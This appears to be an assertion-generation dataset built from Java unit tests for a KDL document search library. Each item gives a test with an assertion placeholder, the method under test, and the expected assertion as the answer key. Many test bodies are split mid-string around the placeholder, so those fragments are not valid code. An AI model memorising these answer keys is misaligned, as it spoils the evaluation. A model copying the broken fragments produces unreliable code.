"testMutateEverythingMatchesPredicateAddChild() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node4 {node5;};}; node3""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(true); when(mutation.apply(any())).thenAnswer(invocation -> { final KDLNode node = invocation.getArgument(0); final KDLDocument.Builder docBuilder = KDLDocument.builder(); node.getChild().ifPresent(ch -> docBuilder.addNodes(ch.getNodes())); docBuilder.addNode(KDLNode.builder().setIdentifier(""added"").build());  return Optional.of(node.toBuilder().setChild(docBuilder.build()).build()); });  ""<AssertPlaceHolder>"";}; node2 {node4 {node5 {added;}; added;}; added;}; node3 {added;}""))); verify(mutation, times(5)).apply(any()); verifyNoMoreInteractions(mutation); }
mutate(KDLDocument document, Mutation fun) { return mutate(fun, document, 0).orElse(KDLDocument.empty()); }"	"assertThat(search.mutate(inputDoc, mutation), equalTo(parser.parse(""node1 {added"
"testMutateRootNodeMatchesPredicateAddChild() { final KDLDocument inputDoc = parser.parse(""node1; node2; node3""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false); when(predicate.test(argThat(hasId(""node2"")))).thenReturn(true); when(mutation.apply(any())).thenAnswer(invocation -> { final KDLNode node = invocation.getArgument(0); final KDLDocument.Builder docBuilder = KDLDocument.builder(); node.getChild().ifPresent(ch -> docBuilder.addNodes(ch.getNodes())); docBuilder.addNode(KDLNode.builder().setIdentifier(""added"").build());  return Optional.of(node.toBuilder().setChild(docBuilder.build()).build()); });  ""<AssertPlaceHolder>""; node2 {added;}; node3""))); verify(mutation, times(1)).apply(argThat(hasId(""node2""))); }
mutate(KDLDocument document, Mutation fun) { return mutate(fun, document, 0).orElse(KDLDocument.empty()); }"	"assertThat(search.mutate(inputDoc, mutation), equalTo(parser.parse(""node1"
"testMutateBranchNodeMatchesPredicateAddChild() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node4 {node5;};}; node3""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false); when(predicate.test(argThat(hasId(""node4"")))).thenReturn(true); when(mutation.apply(any())).thenAnswer(invocation -> { final KDLNode node = invocation.getArgument(0); final KDLDocument.Builder docBuilder = KDLDocument.builder(); node.getChild().ifPresent(ch -> docBuilder.addNodes(ch.getNodes())); docBuilder.addNode(KDLNode.builder().setIdentifier(""added"").build());  return Optional.of(node.toBuilder().setChild(docBuilder.build()).build()); });  ""<AssertPlaceHolder>""; node2 {node4 {node5; added;};}; node3""))); verify(mutation, times(1)).apply(argThat(hasId(""node4""))); }
mutate(KDLDocument document, Mutation fun) { return mutate(fun, document, 0).orElse(KDLDocument.empty()); }"	"assertThat(search.mutate(inputDoc, mutation), equalTo(parser.parse(""node1"
"testMutateLeafNodeMatchesPredicateAddChild() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node4;}; node3""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false); when(predicate.test(argThat(hasId(""node4"")))).thenReturn(true); when(mutation.apply(any())).thenAnswer(invocation -> { final KDLNode node = invocation.getArgument(0); final KDLDocument.Builder docBuilder = KDLDocument.builder(); node.getChild().ifPresent(ch -> docBuilder.addNodes(ch.getNodes())); docBuilder.addNode(KDLNode.builder().setIdentifier(""added"").build());  return Optional.of(node.toBuilder().setChild(docBuilder.build()).build()); });  ""<AssertPlaceHolder>""; node2 {node4 {added;};}; node3""))); verify(mutation, times(1)).apply(argThat(hasId(""node4""))); }
mutate(KDLDocument document, Mutation fun) { return mutate(fun, document, 0).orElse(KDLDocument.empty()); }"	"assertThat(search.mutate(inputDoc, mutation), equalTo(parser.parse(""node1"
"testMutateMinDepthAddChild() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node4;}; node3""); final GeneralSearch search = GeneralSearch.builder() .setPredicate(predicate) .setMaxDepth(0) .build(); when(predicate.test(any())).thenReturn(false); when(predicate.test(argThat(hasId(""node4"")))).thenReturn(true); when(mutation.apply(any())).thenAnswer(invocation -> { final KDLNode node = invocation.getArgument(0); final KDLDocument.Builder docBuilder = KDLDocument.builder(); node.getChild().ifPresent(ch -> docBuilder.addNodes(ch.getNodes())); docBuilder.addNode(KDLNode.builder().setIdentifier(""added"").build());  return Optional.of(node.toBuilder().setChild(docBuilder.build()).build()); });  ""<AssertPlaceHolder>""; verify(mutation, never()).apply(any()); }
mutate(KDLDocument document, Mutation fun) { return mutate(fun, document, 0).orElse(KDLDocument.empty()); }"	assertThat(search.mutate(inputDoc, mutation), equalTo(inputDoc))
"testMutateEverythingMatchesButDepth() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node4 {node5;};}; node3""); final GeneralSearch search = GeneralSearch.builder() .setPredicate(predicate) .setMinDepth(1) .setMaxDepth(1) .build(); when(predicate.test(any())).thenReturn(true); when(mutation.apply(any())).thenAnswer(invocation -> { final KDLNode node = invocation.getArgument(0); return Optional.of(node.toBuilder().addArg(1).build()); });  ""<AssertPlaceHolder>""; node2 {node4 1 {node5;};}; node3""))); verify(mutation, times(1)).apply(argThat(hasId(""node4""))); verifyNoMoreInteractions(mutation); }
mutate(KDLDocument document, Mutation fun) { return mutate(fun, document, 0).orElse(KDLDocument.empty()); }"	"assertThat(search.mutate(inputDoc, mutation), equalTo(parser.parse(""node1"
"testFilterEmpty() { final KDLDocument inputDoc = KDLDocument.empty(); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(true);  ""<AssertPlaceHolder>""; }
filter(KDLDocument document, boolean trim) { return filter(document, 0, trim).orElse(KDLDocument.empty()); }"	assertThat(search.filter(inputDoc, true), equalTo(KDLDocument.empty()))
"testFilterNothingMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3;}""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false);  ""<AssertPlaceHolder>""; }
filter(KDLDocument document, boolean trim) { return filter(document, 0, trim).orElse(KDLDocument.empty()); }"	assertThat(search.filter(inputDoc, true), equalTo(KDLDocument.empty()))
"testFilterRootNodeMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3;}""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false); when(predicate.test(argThat(hasId(""node2"")))).thenReturn(true);  ""<AssertPlaceHolder>""; }
filter(KDLDocument document, boolean trim) { return filter(document, 0, trim).orElse(KDLDocument.empty()); }"	"assertThat(search.filter(inputDoc, true), equalTo(parser.parse(""node2"")))"
"testFilterBranchNodeMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3 {node4;};}""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false); when(predicate.test(argThat(hasId(""node3"")))).thenReturn(true);  ""<AssertPlaceHolder>"";}""))); }
filter(KDLDocument document, boolean trim) { return filter(document, 0, trim).orElse(KDLDocument.empty()); }"	"assertThat(search.filter(inputDoc, true), equalTo(parser.parse(""node2 {node3"
"testFilterLeafNodeMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3 {node4;};}""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false); when(predicate.test(argThat(hasId(""node4"")))).thenReturn(true);  ""<AssertPlaceHolder>"";};}""))); }
filter(KDLDocument document, boolean trim) { return filter(document, 0, trim).orElse(KDLDocument.empty()); }"	"assertThat(search.filter(inputDoc, true), equalTo(parser.parse(""node2 {node3 {node4"
"testFilterMultipleLeavesMatch() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3 {node4; node5;};}""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false); when(predicate.test(argThat(hasId(""node4"")))).thenReturn(true); when(predicate.test(argThat(hasId(""node5"")))).thenReturn(true);  ""<AssertPlaceHolder>""; node5;};}""))); }
filter(KDLDocument document, boolean trim) { return filter(document, 0, trim).orElse(KDLDocument.empty()); }"	"assertThat(search.filter(inputDoc, true), equalTo(parser.parse(""node2 {node3 {node4"
"testFilterEverythingMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3 {node4;};}""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(true);  ""<AssertPlaceHolder>""; node2 {node3 {node4;};}""))); }
filter(KDLDocument document, boolean trim) { return filter(document, 0, trim).orElse(KDLDocument.empty()); }"	"assertThat(search.filter(inputDoc, true), equalTo(parser.parse(""node1"
"testListEmpty() { final KDLDocument inputDoc = KDLDocument.empty(); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(true);  ""<AssertPlaceHolder>""; }
list(KDLDocument document, boolean trim) { final ArrayList<KDLNode> nodes = new ArrayList<>(); list(document, trim, 0, nodes); return KDLDocument.builder().addNodes(nodes).build(); }"	assertThat(search.list(inputDoc, false), equalTo(KDLDocument.empty()))
"testListNothingMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false);  ""<AssertPlaceHolder>""; }
list(KDLDocument document, boolean trim) { final ArrayList<KDLNode> nodes = new ArrayList<>(); list(document, trim, 0, nodes); return KDLDocument.builder().addNodes(nodes).build(); }"	assertThat(search.list(inputDoc, false), equalTo(KDLDocument.empty()))
"testListNothingMatchesTrim() { final KDLDocument inputDoc = parser.parse(""node1; node2""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false);  ""<AssertPlaceHolder>""; }
list(KDLDocument document, boolean trim) { final ArrayList<KDLNode> nodes = new ArrayList<>(); list(document, trim, 0, nodes); return KDLDocument.builder().addNodes(nodes).build(); }"	assertThat(search.list(inputDoc, true), equalTo(KDLDocument.empty()))
"testListEverythingMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3;}""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(true);  ""<AssertPlaceHolder>""; node2 {node3;}; node3""))); }
list(KDLDocument document, boolean trim) { final ArrayList<KDLNode> nodes = new ArrayList<>(); list(document, trim, 0, nodes); return KDLDocument.builder().addNodes(nodes).build(); }"	"assertThat(search.list(inputDoc, false), equalTo(parser.parse(""node1"
"testListEverythingMatchesTrim() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3;}""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(true);  ""<AssertPlaceHolder>""; node2; node3""))); }
list(KDLDocument document, boolean trim) { final ArrayList<KDLNode> nodes = new ArrayList<>(); list(document, trim, 0, nodes); return KDLDocument.builder().addNodes(nodes).build(); }"	"assertThat(search.list(inputDoc, true), equalTo(parser.parse(""node1"
"testListRootNodeMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3 {node4;};}""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false); when(predicate.test(argThat(hasId(""node2"")))).thenReturn(true);  ""<AssertPlaceHolder>"";};}""))); }
list(KDLDocument document, boolean trim) { final ArrayList<KDLNode> nodes = new ArrayList<>(); list(document, trim, 0, nodes); return KDLDocument.builder().addNodes(nodes).build(); }"	"assertThat(search.list(inputDoc, false), equalTo(parser.parse(""node2 {node3 {node4"
"testListRootNodeMatchesTrim() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3 {node4;};}""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false); when(predicate.test(argThat(hasId(""node2"")))).thenReturn(true);  ""<AssertPlaceHolder>""; }
list(KDLDocument document, boolean trim) { final ArrayList<KDLNode> nodes = new ArrayList<>(); list(document, trim, 0, nodes); return KDLDocument.builder().addNodes(nodes).build(); }"	"assertThat(search.list(inputDoc, true), equalTo(parser.parse(""node2"")))"
"testListBranchNodeMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3 {node4;};}""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false); when(predicate.test(argThat(hasId(""node3"")))).thenReturn(true);  ""<AssertPlaceHolder>"";}""))); }
list(KDLDocument document, boolean trim) { final ArrayList<KDLNode> nodes = new ArrayList<>(); list(document, trim, 0, nodes); return KDLDocument.builder().addNodes(nodes).build(); }"	"assertThat(search.list(inputDoc, false), equalTo(parser.parse(""node3 {node4"
"testListBranchNodeMatchesTrim() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3 {node4;};}""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false); when(predicate.test(argThat(hasId(""node3"")))).thenReturn(true);  ""<AssertPlaceHolder>""; }
list(KDLDocument document, boolean trim) { final ArrayList<KDLNode> nodes = new ArrayList<>(); list(document, trim, 0, nodes); return KDLDocument.builder().addNodes(nodes).build(); }"	"assertThat(search.list(inputDoc, true), equalTo(parser.parse(""node3"")))"
"testListLeafNodeMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3 {node4;};}""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false); when(predicate.test(argThat(hasId(""node4"")))).thenReturn(true);  ""<AssertPlaceHolder>""; }
list(KDLDocument document, boolean trim) { final ArrayList<KDLNode> nodes = new ArrayList<>(); list(document, trim, 0, nodes); return KDLDocument.builder().addNodes(nodes).build(); }"	"assertThat(search.list(inputDoc, false), equalTo(parser.parse(""node4"")))"
"testListLeafNodeMatchesTrim() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3 {node4;};}""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false); when(predicate.test(argThat(hasId(""node4"")))).thenReturn(true);  ""<AssertPlaceHolder>""; }
list(KDLDocument document, boolean trim) { final ArrayList<KDLNode> nodes = new ArrayList<>(); list(document, trim, 0, nodes); return KDLDocument.builder().addNodes(nodes).build(); }"	"assertThat(search.list(inputDoc, true), equalTo(parser.parse(""node4"")))"
"testAnyMatchEmpty() { final KDLDocument inputDoc = KDLDocument.empty(); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(true);  ""<AssertPlaceHolder>""; verifyNoInteractions(predicate); }
anyMatch(KDLDocument document) { return anyMatch(document, 0); }"	assertFalse(search.anyMatch(inputDoc))
"testAnyMatchNothingMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false);  ""<AssertPlaceHolder>""; verify(predicate, times(1)).test(argThat(hasId(""node1""))); verify(predicate, times(1)).test(argThat(hasId(""node2""))); }
anyMatch(KDLDocument document) { return anyMatch(document, 0); }"	assertFalse(search.anyMatch(inputDoc))
"testAnyMatchEverythingMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(true);  ""<AssertPlaceHolder>""; verify(predicate, never()).test(argThat(hasId(""node2""))); }
anyMatch(KDLDocument document) { return anyMatch(document, 0); }"	assertTrue(search.anyMatch(inputDoc))
"testAnyMatchRootNodeMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3 {node4;};}""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false); when(predicate.test(argThat(hasId(""node2"")))).thenReturn(true);  ""<AssertPlaceHolder>""; verify(predicate, times(1)).test(argThat(hasId(""node1""))); verify(predicate, times(1)).test(argThat(hasId(""node2""))); verify(predicate, never()).test(argThat(hasId(""node3""))); verify(predicate, never()).test(argThat(hasId(""node4""))); }
anyMatch(KDLDocument document) { return anyMatch(document, 0); }"	assertTrue(search.anyMatch(inputDoc))
"testAnyMatchBranchNodeMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3 {node4;};}""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false); when(predicate.test(argThat(hasId(""node3"")))).thenReturn(true);  ""<AssertPlaceHolder>""; verify(predicate, times(1)).test(argThat(hasId(""node1""))); verify(predicate, times(1)).test(argThat(hasId(""node2""))); verify(predicate, times(1)).test(argThat(hasId(""node3""))); verify(predicate, never()).test(argThat(hasId(""node4""))); }
anyMatch(KDLDocument document) { return anyMatch(document, 0); }"	assertTrue(search.anyMatch(inputDoc))
"testAnyMatchLeafNodeMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3 {node4;};}""); final GeneralSearch search = GeneralSearch.builder().setPredicate(predicate).build(); when(predicate.test(any())).thenReturn(false); when(predicate.test(argThat(hasId(""node4"")))).thenReturn(true);  ""<AssertPlaceHolder>""; verify(predicate, times(1)).test(argThat(hasId(""node1""))); verify(predicate, times(1)).test(argThat(hasId(""node2""))); verify(predicate, times(1)).test(argThat(hasId(""node3""))); verify(predicate, times(1)).test(argThat(hasId(""node4""))); }
anyMatch(KDLDocument document) { return anyMatch(document, 0); }"	assertTrue(search.anyMatch(inputDoc))
"testMutateEmpty() { final KDLDocument inputDoc = KDLDocument.empty(); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .build(); when(predicate1.test(any())).thenReturn(true);  ""<AssertPlaceHolder>""; verifyNoInteractions(mutation, predicate1); }
mutate(KDLDocument document, Mutation mutation) { return mutate(document, mutation, 0).orElse(KDLDocument.empty()); }"	assertThat(search.mutate(inputDoc, mutation), equalTo(KDLDocument.empty()))
"testMutateNothingMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3;}""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .build(); when(predicate1.test(any())).thenReturn(false);  ""<AssertPlaceHolder>""; verifyNoInteractions(mutation); }
mutate(KDLDocument document, Mutation mutation) { return mutate(document, mutation, 0).orElse(KDLDocument.empty()); }"	assertThat(search.mutate(inputDoc, mutation), equalTo(inputDoc))
"testMutateEverythingAtRootMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3;}""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .build(); when(predicate1.test(any())).thenReturn(true); when(mutation.apply(any())).thenAnswer(invocation -> { final KDLNode node = invocation.getArgument(0); return Optional.of(node.toBuilder().addArg(1).build()); });  ""<AssertPlaceHolder>""; node2 1 {node3;}""))); verify(predicate1, times(1)).test(argThat(hasId(""node1""))); verify(predicate1, times(1)).test(argThat(hasId(""node2""))); verify(mutation, times(1)).apply(argThat(hasId(""node1""))); verify(mutation, times(1)).apply(argThat(hasId(""node2""))); verifyNoMoreInteractions(predicate1, mutation); }
mutate(KDLDocument document, Mutation mutation) { return mutate(document, mutation, 0).orElse(KDLDocument.empty()); }"	"assertThat(search.mutate(inputDoc, mutation), equalTo(parser.parse(""node1 1"
"testMutateEverythingAtSecondLevelMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3; node4;}""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .addLevel(predicate2) .build(); when(predicate1.test(any())).thenReturn(true); when(predicate2.test(any())).thenReturn(true); when(mutation.apply(any())).thenAnswer(invocation -> { final KDLNode node = invocation.getArgument(0); return Optional.of(node.toBuilder().addArg(1).build()); });  ""<AssertPlaceHolder>""; node2 {node3 1; node4 1;}""))); verify(predicate1, times(1)).test(argThat(hasId(""node1""))); verify(predicate1, times(1)).test(argThat(hasId(""node2""))); verify(predicate2, times(1)).test(argThat(hasId(""node3""))); verify(predicate2, times(1)).test(argThat(hasId(""node4""))); verify(mutation, times(1)).apply(argThat(hasId(""node3""))); verify(mutation, times(1)).apply(argThat(hasId(""node4""))); verifyNoMoreInteractions(predicate1, predicate2, mutation); }
mutate(KDLDocument document, Mutation mutation) { return mutate(document, mutation, 0).orElse(KDLDocument.empty()); }"	"assertThat(search.mutate(inputDoc, mutation), equalTo(parser.parse(""node1"
"testMutateEverythingAtThirdLevelMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3 {node5;}; node4 {node6;};}""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .addLevel(predicate2) .addLevel(predicate3) .build(); when(predicate1.test(any())).thenReturn(true); when(predicate2.test(any())).thenReturn(true); when(predicate3.test(any())).thenReturn(true); when(mutation.apply(any())).thenAnswer(invocation -> { final KDLNode node = invocation.getArgument(0); return Optional.of(node.toBuilder().addArg(1).build()); });  ""<AssertPlaceHolder>""; node2 {node3 {node5 1;}; node4 {node6 1;};}""))); verify(predicate1, times(1)).test(argThat(hasId(""node1""))); verify(predicate1, times(1)).test(argThat(hasId(""node2""))); verify(predicate2, times(1)).test(argThat(hasId(""node3""))); verify(predicate2, times(1)).test(argThat(hasId(""node4""))); verify(predicate3, times(1)).test(argThat(hasId(""node5""))); verify(predicate3, times(1)).test(argThat(hasId(""node6""))); verify(mutation, times(1)).apply(argThat(hasId(""node5""))); verify(mutation, times(1)).apply(argThat(hasId(""node6""))); verifyNoMoreInteractions(predicate1, predicate2, predicate3, mutation); }
mutate(KDLDocument document, Mutation mutation) { return mutate(document, mutation, 0).orElse(KDLDocument.empty()); }"	"assertThat(search.mutate(inputDoc, mutation), equalTo(parser.parse(""node1"
"testMutateSomeThingsAtFirstLevelEverythingAtSecondLevelMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3; node4;}; node5 {node6;}""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .addLevel(predicate2) .build(); when(predicate1.test(any())).thenReturn(false); when(predicate1.test(argThat(hasId(""node5"")))).thenReturn(true); when(predicate2.test(any())).thenReturn(true); when(mutation.apply(any())).thenAnswer(invocation -> { final KDLNode node = invocation.getArgument(0); return Optional.of(node.toBuilder().addArg(1).build()); });  ""<AssertPlaceHolder>""; node2 {node3; node4;}; node5 {node6 1;}""))); verify(predicate1, times(1)).test(argThat(hasId(""node1""))); verify(predicate1, times(1)).test(argThat(hasId(""node2""))); verify(predicate1, times(1)).test(argThat(hasId(""node5""))); verify(predicate2, times(1)).test(argThat(hasId(""node6""))); verify(mutation, times(1)).apply(argThat(hasId(""node6""))); verifyNoMoreInteractions(predicate1, predicate2, mutation); }
mutate(KDLDocument document, Mutation mutation) { return mutate(document, mutation, 0).orElse(KDLDocument.empty()); }"	"assertThat(search.mutate(inputDoc, mutation), equalTo(parser.parse(""node1"
"testMutateNothingAtFirstLevelEverythingAtSecondLevelMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3; node4;}; node5 {node6;}""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .addLevel(predicate2) .build(); when(predicate1.test(any())).thenReturn(false); when(predicate2.test(any())).thenReturn(true); when(mutation.apply(any())).thenAnswer(invocation -> { final KDLNode node = invocation.getArgument(0); return Optional.of(node.toBuilder().addArg(1).build()); });  ""<AssertPlaceHolder>""; node2 {node3; node4;}; node5 {node6;}""))); verify(predicate1, times(1)).test(argThat(hasId(""node1""))); verify(predicate1, times(1)).test(argThat(hasId(""node2""))); verify(predicate1, times(1)).test(argThat(hasId(""node5""))); verifyNoMoreInteractions(predicate1, predicate2, mutation); }
mutate(KDLDocument document, Mutation mutation) { return mutate(document, mutation, 0).orElse(KDLDocument.empty()); }"	"assertThat(search.mutate(inputDoc, mutation), equalTo(parser.parse(""node1"
"testMutateEverythingAtFirstLevelNothingAtSecondLevelMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3; node4;}; node5 {node6;}""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .addLevel(predicate2) .build(); when(predicate1.test(any())).thenReturn(true); when(predicate2.test(any())).thenReturn(false); when(mutation.apply(any())).thenAnswer(invocation -> { final KDLNode node = invocation.getArgument(0); return Optional.of(node.toBuilder().addArg(1).build()); });  ""<AssertPlaceHolder>""; node2 {node3; node4;}; node5 {node6;}""))); verify(predicate1, times(1)).test(argThat(hasId(""node1""))); verify(predicate1, times(1)).test(argThat(hasId(""node2""))); verify(predicate1, times(1)).test(argThat(hasId(""node5""))); verify(predicate2, times(1)).test(argThat(hasId(""node3""))); verify(predicate2, times(1)).test(argThat(hasId(""node4""))); verify(predicate2, times(1)).test(argThat(hasId(""node6""))); verifyNoMoreInteractions(predicate1, predicate2, mutation); }
mutate(KDLDocument document, Mutation mutation) { return mutate(document, mutation, 0).orElse(KDLDocument.empty()); }"	"assertThat(search.mutate(inputDoc, mutation), equalTo(parser.parse(""node1"
"testListEmpty() { final KDLDocument inputDoc = KDLDocument.empty(); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .build(); when(predicate1.test(any())).thenReturn(true);  ""<AssertPlaceHolder>""; verifyNoInteractions(predicate1); }
list(KDLDocument document, boolean trim) { final ArrayList<KDLNode> nodes = new ArrayList<>(); list(document, trim, 0, nodes); return KDLDocument.builder().addNodes(nodes).build(); }"	assertThat(search.list(inputDoc, false), equalTo(KDLDocument.empty()))
"testListNothingMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .build(); when(predicate1.test(any())).thenReturn(false);  ""<AssertPlaceHolder>""; verify(predicate1, times(1)).test(argThat(hasId(""node1""))); verify(predicate1, times(1)).test(argThat(hasId(""node2""))); verifyNoMoreInteractions(predicate1); }
list(KDLDocument document, boolean trim) { final ArrayList<KDLNode> nodes = new ArrayList<>(); list(document, trim, 0, nodes); return KDLDocument.builder().addNodes(nodes).build(); }"	assertThat(search.list(inputDoc, false), equalTo(KDLDocument.empty()))
"testListEverythingMatches() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3;}""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .build(); when(predicate1.test(any())).thenReturn(true);  ""<AssertPlaceHolder>""; node2 {node3;}""))); verify(predicate1, times(1)).test(argThat(hasId(""node1""))); verify(predicate1, times(1)).test(argThat(hasId(""node2""))); verifyNoMoreInteractions(predicate1); }
list(KDLDocument document, boolean trim) { final ArrayList<KDLNode> nodes = new ArrayList<>(); list(document, trim, 0, nodes); return KDLDocument.builder().addNodes(nodes).build(); }"	"assertThat(search.list(inputDoc, false), equalTo(parser.parse(""node1"
"testListEverythingMatchesTrim() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3;}""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .build(); when(predicate1.test(any())).thenReturn(true);  ""<AssertPlaceHolder>""; node2""))); verify(predicate1, times(1)).test(argThat(hasId(""node1""))); verify(predicate1, times(1)).test(argThat(hasId(""node2""))); verifyNoMoreInteractions(predicate1); }
list(KDLDocument document, boolean trim) { final ArrayList<KDLNode> nodes = new ArrayList<>(); list(document, trim, 0, nodes); return KDLDocument.builder().addNodes(nodes).build(); }"	"assertThat(search.list(inputDoc, true), equalTo(parser.parse(""node1"
"testListBranch() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3 {node4;};}""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .addLevel(predicate2) .build(); when(predicate1.test(any())).thenReturn(true); when(predicate2.test(any())).thenReturn(true);  ""<AssertPlaceHolder>"";}""))); verify(predicate1, times(1)).test(argThat(hasId(""node1""))); verify(predicate1, times(1)).test(argThat(hasId(""node2""))); verify(predicate2, times(1)).test(argThat(hasId(""node3""))); verifyNoMoreInteractions(predicate1, predicate2); }
list(KDLDocument document, boolean trim) { final ArrayList<KDLNode> nodes = new ArrayList<>(); list(document, trim, 0, nodes); return KDLDocument.builder().addNodes(nodes).build(); }"	"assertThat(search.list(inputDoc, false), equalTo(parser.parse(""node3 {node4"
"testListBranchTrim() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3 {node4;};}""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .addLevel(predicate2) .build(); when(predicate1.test(any())).thenReturn(true); when(predicate2.test(any())).thenReturn(true);  ""<AssertPlaceHolder>""; verify(predicate1, times(1)).test(argThat(hasId(""node1""))); verify(predicate1, times(1)).test(argThat(hasId(""node2""))); verify(predicate2, times(1)).test(argThat(hasId(""node3""))); verifyNoMoreInteractions(predicate1, predicate2); }
list(KDLDocument document, boolean trim) { final ArrayList<KDLNode> nodes = new ArrayList<>(); list(document, trim, 0, nodes); return KDLDocument.builder().addNodes(nodes).build(); }"	"assertThat(search.list(inputDoc, true), equalTo(parser.parse(""node3"")))"
"testListLeaf() { final KDLDocument inputDoc = parser.parse(""node1; node2 {node3 {node4;};}""); final PathedSearch search = PathedSearch.builder() .addLevel(predicate1) .addLevel(predicate2) .addLevel(predicate3) .build(); when(predicate1.test(any())).thenReturn(true); when(predicate2.test(any())).thenReturn(true); when(predicate3.test(any())).thenReturn(true);  ""<AssertPlaceHolder>""; verify(predicate1, times(1)).test(argThat(hasId(""node1""))); verify(predicate1, times(1)).test(argThat(hasId(""node2""))); verify(predicate2, times(1)).test(argThat(hasId(""node3""))); verify(predicate3, times(1)).test(argThat(hasId(""node4""))); verifyNoMoreInteractions(predicate1, predicate2, predicate3); }
list(KDLDocument document, boolean trim) { final ArrayList<KDLNode> nodes = new ArrayList<>(); list(document, trim, 0, nodes); return KDLDocument.builder().addNodes(nodes).build(); }"	"assertThat(search.list(inputDoc, false), equalTo(parser.parse(""node4"")))"
